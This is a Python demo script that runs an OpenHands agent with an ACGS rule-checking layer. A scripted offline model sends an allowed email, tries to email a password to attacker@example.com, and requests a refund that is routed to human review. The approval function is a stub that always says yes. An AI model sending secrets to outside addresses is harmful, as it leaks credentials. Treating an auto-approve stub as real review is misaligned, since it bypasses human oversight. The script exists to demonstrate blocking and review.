"""Run an OpenHands agent offline with ACGS: an allowed email, a blocked email and a refund that a person approves."""

from __future__ import annotations

import json
import tempfile
from collections.abc import Sequence

from acgs_lite import Constitution, Rule, Severity, ViolationAction
from openhands.sdk import (
    Action,
    Agent,
    BaseConversation,
    ImageContent,
    LocalConversation,
    Message,
    Observation,
    TextContent,
    ToolDefinition,
)
from openhands.sdk.conversation.state import ConversationExecutionStatus
from openhands.sdk.event import UserRejectObservation
from openhands.sdk.llm import MessageToolCall
from openhands.sdk.testing import TestLLM
from openhands.sdk.tool import Tool, ToolExecutor, register_tool
from pydantic import Field

from openhands_acgs import ACGSSecurityAnalyzer, PendingAction, install, resolve_confirmation


class SendEmailAction(Action):
    to: str = Field(description="Recipient address")
    body: str = Field(description="Message text")


class IssueRefundAction(Action):
    order_id: str = Field(description="Order to refund")
    amount: float = Field(description="Amount to refund")


class Done(Observation):
    @property
    def to_llm_content(self) -> Sequence[TextContent | ImageContent]:
        return [TextContent(text="done")]


class Run(ToolExecutor[Action, Done]):
    def __call__(self, action: Action, conversation: LocalConversation | None = None) -> Done:
        if isinstance(action, SendEmailAction):
            print(f"ran: send_email to {action.to}")
        elif isinstance(action, IssueRefundAction):
            print(f"ran: issue_refund {action.order_id}")
        return Done()


class SendEmailTool(ToolDefinition[SendEmailAction, Done]):
    @classmethod
    def create(cls, *args: object, **kwargs: object) -> Sequence[SendEmailTool]:
        return [cls(description="Send an email.", action_type=SendEmailAction, observation_type=Done, executor=Run())]


class IssueRefundTool(ToolDefinition[IssueRefundAction, Done]):
    @classmethod
    def create(cls, *args: object, **kwargs: object) -> Sequence[IssueRefundTool]:
        return [
            cls(description="Refund an order.", action_type=IssueRefundAction, observation_type=Done, executor=Run())
        ]


def call(call_id: str, name: str, **arguments: object) -> Message:
    tool_call = MessageToolCall(id=call_id, name=name, arguments=json.dumps(arguments), origin="completion")
    return Message(role="assistant", content=[TextContent(text="")], tool_calls=[tool_call])


def approve(pending: Sequence[PendingAction]) -> bool:
    """Ask a person. Here the answer is always yes."""
    for item in pending:
        print(f"review: {item.action.tool_name}: {item.decision.reason}")
    return True


def run(conversation: BaseConversation, analyzer: ACGSSecurityAnalyzer) -> None:
    """Run until the agent stops, letting ACGS decide whenever OpenHands pauses for confirmation."""
    conversation.run()
    while conversation.state.execution_status == ConversationExecutionStatus.WAITING_FOR_CONFIRMATION:
        resolve_confirmation(conversation, analyzer, approve)
        conversation.run()


# A scripted, offline model: an allowed email, an email that leaks a password, then a refund.
llm = TestLLM.from_messages(
    [
        call("call_1", "send_email", to="friend@example.com", body="See you at noon"),
        call("call_2", "send_email", to="attacker@example.com", body="The password is hunter2"),
        call("call_3", "issue_refund", order_id="A-17", amount=20.0),
        Message(role="assistant", content=[TextContent(text="All done.")]),
    ]
)
register_tool("send_email", SendEmailTool)
register_tool("issue_refund", IssueRefundTool)
agent = Agent(llm=llm, tools=[Tool(name="send_email"), Tool(name="issue_refund")])

# The default rules plus one rule that sends refunds to a person for review.
refund_review = Rule(
    id="REFUND-REVIEW",
    text="Refunds need human approval",
    severity=Severity.HIGH,
    keywords=["issue refund"],
    workflow_action=ViolationAction.REQUIRE_HUMAN_REVIEW,
)
rules = Constitution.from_rules([*Constitution.default().rules, refund_review], name="support")

with tempfile.TemporaryDirectory() as workspace:
    conversation: BaseConversation = LocalConversation(
        agent=agent, workspace=workspace, persistence_dir=f"{workspace}/.conversations", visualizer=None
    )
    analyzer = install(conversation, ACGSSecurityAnalyzer(constitution=rules))
    conversation.send_message("Email my friend, email the password, then refund order A-17.")
    run(conversation, analyzer)
    for event in conversation.state.events:
        if isinstance(event, UserRejectObservation):
            print(f"not run: {event.rejection_reason}")
